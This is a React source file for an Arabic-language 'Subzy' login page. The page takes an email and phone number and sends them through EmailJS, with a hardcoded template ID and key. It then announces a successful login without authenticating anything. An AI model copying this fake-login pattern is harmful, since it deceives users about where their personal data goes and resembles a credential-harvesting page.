import { useState } from "react";
import emailjs from "@emailjs/browser";

export default function LoginPage() {
  const [formData, setFormData] = useState({
    user_email: "",
    user_phone: "",
  });

  const handleChange = (e) => {
    setFormData((prev) => ({
      ...prev,
      [e.target.name]: e.target.value,
    }));
  };

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.send(
      "service_xxxxxx", // 🔁 Service ID
      "template_pdyrmfr", // 🔁 Template ID
      formData,
      "4ZUhJ78IGMM8CpFVF" // 🔁 Public key
    )
    .then(() => {
      alert("تم تسجيل الدخول بنجاح! ✅");
      setFormData({ user_email: "", user_phone: "" });
    })
    .catch((error) => {
      console.error("خطأ في الإرسال", error);
      alert("حدث خطأ أثناء الإرسال ❌");
    });
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#ffcfe0] p-6 text-center">
      <img
        src="/logos/subzy-logo.png"
        alt="Subzy Logo"
        className="w-48 mb-8 drop-shadow-xl"
      />

      <form onSubmit={sendEmail} className="bg-white p-6 rounded-xl shadow-md w-full max-w-sm">
        <h2 className="text-xl font-bold text-red-500 mb-4">تسجيل الدخول</h2>

        <input
          type="email"
          name="user_email"
          placeholder="الإيميل"
          value={formData.user_email}
          onChange={handleChange}
          required
          className="w-full mb-3 px-4 py-2 rounded border"
        />

        <input
          type="text"
          name="user_phone"
          placeholder="رقم الجوال"
          value={formData.user_phone}
          onChange={handleChange}
          required
          className="w-full mb-4 px-4 py-2 rounded border"
        />

        <button
          type="submit"
          className="bg-red-500 hover:bg-red-600 text-white w-full py-2 rounded font-bold"
        >
          تسجيل الدخول
        </button>
      </form>
    </div>
  );
}
